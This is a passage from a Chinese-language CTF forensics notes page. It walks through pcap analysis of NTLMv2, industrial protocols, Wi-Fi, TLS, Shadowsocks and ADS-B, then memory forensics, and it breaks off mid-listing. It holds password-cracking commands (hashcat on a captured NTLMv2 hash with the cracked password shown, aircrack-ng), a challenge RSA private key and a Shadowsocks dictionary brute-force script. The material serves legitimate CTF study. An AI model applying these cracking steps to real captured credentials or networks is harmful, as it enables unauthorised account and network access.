<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000</span><br></pre></td></tr></table></figure>
<p>最后使用 hashcat 进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 5600 hash.txt rockyou.txt --show</span><br><span class="line">ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#</span><br></pre></td></tr></table></figure>
<h4 id="提取-NTLMv2-哈希值并破解（HTTP协议）">提取 NTLMv2 哈希值并破解（HTTP协议）</h4>
<p>大致步骤和SMB协议的差不多，就是NTLM信息放在了 hypertext transport protocol 中<br>
按照之前的步骤提取出来，然后 hashcat 爆破即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="提取-NTLMv2-哈希值并破解（SMTP协议）">提取 NTLMv2 哈希值并破解（SMTP协议）</h4>
<p>这里的NTLM流量信息可能base64编码过了，所以分析前需要base64解码：</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N6.png"
                        alt=""
                 ></p>
<p>后续步骤就和之前一样了，提取信息然后用 hashcat 爆破</p>
<h4 id="本地RDP流量分析">本地RDP流量分析</h4>
<p>在WireShark中导出<code>PDU到文件</code>，选择<code>OSI Layer 7</code>，保存为<code>pcap文件</code>，然后使用PyRDP导出为可识别类型。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrdp-convert -o output rdp.pcap</span><br></pre></td></tr></table></figure>
<p>导出完成后启动GUI界面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyrdp-player</span><br></pre></td></tr></table></figure>
<p>即可看RDP的操作。</p>
<h4 id="工控流量分析">工控流量分析</h4>
<p>参考连接：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/song123sh/article/details/128387982" >https://blog.csdn.net/song123sh/article/details/128387982<i class="fas fa-external-link-alt"></i></a></p>
<p>将流量按长度降序排列，然后在各层寻找线索，<br>
显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型</p>
<h4 id="Modbus-协议分析">Modbus 协议分析</h4>
<p>Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP</p>
<h4 id="Modbus-RTU"><strong>Modbus/RTU</strong></h4>
<blockquote>
<p>从机地址1B+功能码1B+数据字段xB+CRC值2B<br>
最大长度256B，所以数据字段最大长度252B</p>
</blockquote>
<p><strong>Modbus/ASCII</strong></p>
<blockquote>
<p>由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍<br>
开始标记:（0x3A）1B+从机地址2B+功能码2B+数据字段xB+LRC值2B+结束标记\r\n2B<br>
最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B</p>
</blockquote>
<p><strong>Modbus/TCP</strong></p>
<blockquote>
<p>不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验<br>
传输标识符2B+协议标识符2B+长度2B+从机ID 1B+功能码1B+数据字段xB</p>
</blockquote>
<p>一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）<br>
因此解题的时候配合过滤器一个个功能码看过去就行</p>
<blockquote>
<p>1：读线圈<br>
2：读离散输入<br>
3：读保持<br>
4：读输入<br>
5：写单个线圈<br>
6：写单个保持<br>
15：写多个线圈<br>
16：写多个保持</p>
</blockquote>
<h5 id="例题1-HNGK-Modbus流量分析">例题1 HNGK-Modbus流量分析</h5>
<p>使用下面这个过滤器命令即可得到 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((_ws.col.protocol == &quot;Modbus/TCP&quot;) ) &amp;&amp; (modbus.byte_cnt)) &amp;&amp; (modbus.func_code == 16)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430142133329.png"
                        alt=""
                 ><br>
flag{TheModbusProtocolIsFunny!}</p>
<h4 id="S7comm-协议分析">S7comm 协议分析</h4>
<blockquote>
<p>西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议<br>
主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7)<br>
Job：下发任务/指令<br>
Ack_Data：带有返回数据<br>
Ack：单纯确认，含有数据<br>
Userdata：用户自定义数据区，也包含功能指令</p>
</blockquote>
<h5 id="例题1-2020ICSC湖州站—工控协议数据分析">例题1 2020ICSC湖州站—工控协议数据分析</h5>
<p>首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430111822297.png"
                        alt=""
                 ><br>
因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430112312109.png"
                        alt=""
                 ><br>
然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((s7comm) &amp;&amp; (s7comm.resp.data)) &amp;&amp; (s7comm.param.func == 0x05)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430112740044.png"
                        alt=""
                 ></p>
<p>然后使用 tshark 提取数据</p>
<p>然后使用 tshark 提取数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430112936680.png"
                        alt=""
                 ></p>
<p>最后 CyberChef 解码二进制即可得到 flag<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430113016466.png"
                        alt=""
                 ></p>
<p><strong>例题2 2020ICSC济南站—被篡改的数据</strong></p>
<p>翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据<br>
使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包<br>
发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤<br>
因此我们使用下面这个过滤命令进行过滤，然后导出特定分组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((frame.number &gt;= 19987 &amp;&amp; frame.number &lt;=20032) &amp;&amp; (_ws.col.protocol == &quot;S7COMM&quot;)) &amp;&amp; (s7comm.param.func == 0x05)) &amp;&amp; (s7comm.resp.data)</span><br></pre></td></tr></table></figure>
<p>最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}</p>
<p><strong>例题3 枢网智盾2021—异常流分析</strong></p>
<p>打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量<br>
然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((_ws.col.protocol == &quot;S7COMM&quot;) &amp;&amp; (s7comm.param.func == 0x05)) &amp;&amp; (s7comm.resp.data[0:2] != ff:ff)</span><br></pre></td></tr></table></figure>
<p>即可得到 flag：flag{ffad28a0ce69db34751f}</p>
<p><strong>例题4 枢网智盾2021—工控协议分析</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(_ws.col.protocol == &quot;S7COMM&quot;) &amp;&amp; (frame.number == 418)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430135813366.png"
                        alt=""
                 ></p>
<p>然后直接把明文传输的数据 base64 解码即可<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240430135958048.png"
                        alt=""
                 ><br>
flag{hncome66!}</p>
<h4 id="蓝牙-OBEX-流量分析">蓝牙(OBEX)流量分析</h4>
<p>在统计的协议分级中选中OBEX协议<br>
然后查找pin的分组详情，获得压缩包的密码</p>
<h4 id="邮件-STMP-流量分析">邮件(STMP)流量分析</h4>
<p>可以试试看导出对象-导出IMF-导出文件的后缀是eml（可以使用网易邮箱大师打开）</p>
<p>eml文件是将数据base64编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍</p>
<h4 id="无线流量分析">无线流量分析</h4>
<p>在kali中用弱口令密码爆破出WIFI密码<br>
执行命令：aircrack-ng ctf.pcap -w rockyou.txt<br>
执行命令解码：airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap<br>
然后打开解码后的文件，查找flag</p>
<h4 id="SLL、TLS加密流量分析">SLL、TLS加密流量分析</h4>
<p>老版本的 wireshark 中显示的是 SSL，新版本的改成TLS了</p>
<p>解密方法就是点击 编辑 -&gt; 首选项 -&gt; Protocols -&gt; TLS 加载 RSA 私钥 或 者加载日志文件<br>
解完密后就和平常的流量分析一样了</p>
<p>例题-BUU 第九章TLS流量分析</p>
<p>打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了</p>
<p>翻看流量包，追踪 TCP 流，发现流7中POST了一个 sslkey.log 日志文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N7.png"
                        alt=""
                 ></p>
<p>导出 sslkey.log 日志文件，然后按上面的步骤导入解密</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N8.png"
                        alt=""
                 ></p>
<p>解密完后直接搜索 flag{ 字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N9.png"
                        alt=""
                 ></p>
<p>例题-DDCTF2018 流量分析</p>
<p>直接在 TLS 加载 RSA 私钥解密即可</p>
<p>私钥的格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>例题-2024铁三初赛 流量分析</p>
<h5 id="PFX证书导入">PFX证书导入</h5>
<p>如果题目给的是der和pfx证书，输入密码后新版本的wireshark可以直接作为TLS密钥使用，一般Windows证书都是用<code>mimikatz</code>导出的，那么密码就是<code>mimikatz</code>，其他情况需要<code>pfx2john</code>爆破一下。</p>
<h5 id="MMTLS-微信安全通信协议">MMTLS - 微信安全通信协议</h5>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/WeMobileDev/article/blob/master/%E5%9F%BA%E4%BA%8ETLS1.3%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AEmmtls%E4%BB%8B%E7%BB%8D.md" >article/基于TLS1.3的微信安全通信协议mmtls介绍.md at master · WeMobileDev/article<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="VPN流量分析">VPN流量分析</h4>
<h5 id="Shadowsocks流量分析">Shadowsocks流量分析</h5>
<p>例题-2023强网杯-谍影重重3.0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求解密脚本</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EVP_BytesToKey</span>(<span class="params">password, key_len, iv_len</span>):</span><br><span class="line">    m = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(<span class="string">b&#x27;&#x27;</span>.join(m)) &lt; (key_len + iv_len):</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        data = password</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            data = m[i - <span class="number">1</span>] + password</span><br><span class="line">        md5.update(data)</span><br><span class="line">        m.append(md5.digest())</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    ms = <span class="string">b&#x27;&#x27;</span>.join(m)</span><br><span class="line">    key = ms[:key_len]</span><br><span class="line">    iv = ms[key_len:key_len + iv_len]</span><br><span class="line">    <span class="keyword">return</span> key, iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, password</span>):</span><br><span class="line">    key_len = <span class="built_in">int</span>(<span class="number">256</span>/<span class="number">8</span>)</span><br><span class="line">    iv_len = <span class="number">16</span></span><br><span class="line">    mode = AES.MODE_CFB</span><br><span class="line">    key, _ = EVP_BytesToKey(password, key_len, iv_len)</span><br><span class="line">    cipher = <span class="built_in">bytes</span>.fromhex(cipher)</span><br><span class="line">    iv = cipher[:iv_len]</span><br><span class="line">    real_cipher = cipher[iv_len:]</span><br><span class="line">    obj = AES.new(key, mode, iv, segment_size=<span class="number">128</span>)</span><br><span class="line">    plain = obj.decrypt(real_cipher)</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">cipher = <span class="string">&#x27;e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206&#x27;</span></span><br><span class="line">    <span class="comment"># 因为password未知，所以我们这里尝试用字典进行爆破</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rockyou.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> lines:</span><br><span class="line">        plain = decrypt(cipher, password.strip())</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;HTTP&#x27;</span> <span class="keyword">in</span> plain:</span><br><span class="line">            <span class="built_in">print</span>(password.decode(), plain.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h5 id="VMess-V2ray-流量分析">VMess(V2ray)流量分析</h5>
<p><strong>VMessMD5</strong></p>
<p>【例题：2022强网杯-谍影重重】</p>
<p><strong>VMessAEAD</strong></p>
<p>【例题：2024 DubheCTF-authenticated mess &amp; unauthenticated less】</p>
<h5 id="ADS-B流量分析">ADS-B流量分析</h5>
<p>飞机/航空器流量，找到流量数据，用pyModeS模块分析即可</p>
<p>例题</p>
<p><strong>[2023 强网杯] 谍影重重2.0</strong></p>
<p>下载附件得到一个只有TCP流量的流量包<br>
题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE<br>
问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块<br>
在参考链接：<a class="link"   target="_blank" rel="noopener" href="https://gitee.com/wangmin-gf/ads-b" >https://gitee.com/wangmin-gf/ads-b<i class="fas fa-external-link-alt"></i></a> 看到了与tcp.payload中相似的数据<br>
使用tshark提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可</p>
<p>tshark -r attach.pcapng -T fields -e “tcp.payload” | sed ‘/^\s*$/d’ &gt; tshark.txt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyModeS</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tshark.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># print(item.strip())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(item.strip()) != <span class="number">46</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res = pyModeS.tell(item.strip()[<span class="number">18</span>:<span class="number">46</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;===========================================================================&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">===========================================================================</span><br><span class="line">                     Message: 8d79a05e990ccda6f80886dd9544</span><br><span class="line">                ICAO address: 79a05e</span><br><span class="line">             Downlink Format: 17</span><br><span class="line">                    Protocol: Mode-S Extended Squitter (ADS-B)</span><br><span class="line">                        Type: Airborne velocity</span><br><span class="line">                       Speed: 371 knots</span><br><span class="line">                       Track: 213.3474959459136 degrees</span><br><span class="line">               Vertical rate: -64 feet/minute</span><br><span class="line">                        Type: Ground speed</span><br><span class="line">===========================================================================</span><br></pre></td></tr></table></figure>
<h4 id="损坏的流量包分析">损坏的流量包分析</h4>
<p>例题-第一届“百度杯”信息安全攻防总决赛 find the flag（flag藏在 frame29-41 的 <a class="link"   target="_blank" rel="noopener" href="http://ip.id" >ip.id<i class="fas fa-external-link-alt"></i></a> 字段中）</p>
<p>打开流量包后发现有如下的报错</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N10.png"
                        alt=""
                 ></p>
<p>可以直接使用 <a class="link"   target="_blank" rel="noopener" href="https://f00l.de/hacking/pcapfix.php" >在线网站<i class="fas fa-external-link-alt"></i></a> 修复</p>
<p>修复完成以后就是正常的流量分析了</p>
<h4 id="从流量包中找异常流量">从流量包中找异常流量</h4>
<p>一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数，<br>
然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。</p>
<h3 id="内存取证">内存取证</h3>
<p>常见文件后缀：.vmem / .dump / .raw / .img</p>
<p>内存取证除了常用的 Vol 以外，也可以尝试一下 R-Stdio 这个工具，提取文件的时候不一定哪个可以用</p>
<p>打开 R-Stdio -&gt; 驱动器 -&gt; 打开镜像 -&gt; 扫描</p>
<p>也可以直接010手提，如果做不出来的时候可以<code>foremost</code>提取一下，说不定会有奇效~~（2024网鼎杯你说是吧）~~</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Rstdio1.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Rstdio2.png"
                        alt=""
                 ></p>
<p><a class="link"   target="_blank" rel="noopener" href="http://vol.py" >vol.py<i class="fas fa-external-link-alt"></i></a> --info 可以查看插件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#官方WIKI</span></span><br><span class="line">https://github.com/volatilityfoundation/volatility/wiki</span><br><span class="line"><span class="comment">#点击右侧的Command References来查看具体参数的用法</span></span><br></pre></td></tr></table></figure>
<h4 id="Windows内存取证">Windows内存取证</h4>
<p>不是Windows10的内存镜像的话可以直接用 Vol_all_in_one 一键分析</p>
<p>取证过程中一定要记得查看镜像桌面上的文件！</p>
<h5 id="Volatility2">Volatility2</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span 